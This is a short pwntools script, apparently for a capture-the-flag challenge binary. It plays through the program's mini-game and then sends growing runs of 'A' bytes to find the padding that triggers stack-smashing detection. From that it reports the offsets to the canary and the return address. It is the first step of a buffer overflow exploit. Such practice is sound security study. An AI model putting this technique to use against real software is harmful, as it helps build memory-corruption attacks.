from pwn import *

BINARY = './super_jumpio_kart'
context.binary = BINARY

def find_crash_offset():
    for i in range(1, 200):
        # Thiết lập để chạy với libc được cung cấp
        p = process([context.binary.path]) 
        
        try:
            print(f"[*] Testing padding length: {i}")
            
            # Bỏ qua phần custom()
            p.sendlineafter(b'> ', b'1')
            
            # Vượt qua mini-game
            for _ in range(7):
                line = p.recvuntil((b'LEFT', b'RIGHT'), timeout=1)
                if b'LEFT' in line:
                    p.sendline(b'L')
                elif b'RIGHT' in line:
                    p.sendline(b'R')
                p.recvuntil(b'Nice!', timeout=1)
            
            p.sendlineafter(b'> ', b'y')

            payload = b'A' * i
            p.sendlineafter(b'your victory: ', payload)

            output = p.recvall(timeout=0.5)
            if b'stack smashing detected' in output:
                print(f"\n[+] SUCCESS! Program crashed with padding: {i}")
                print(f"[+] Offset to Canary is: {i}")
                print(f"[+] Offset to Return Address is: {i + 8}")
                p.close()
                return i
            
            p.close()
        except Exception as e:
            # print(f"Error at offset {i}: {e}")
            p.close()
    
    print("[!] Could not find crash offset.")
    return None

if __name__ == '__main__':
    find_crash_offset()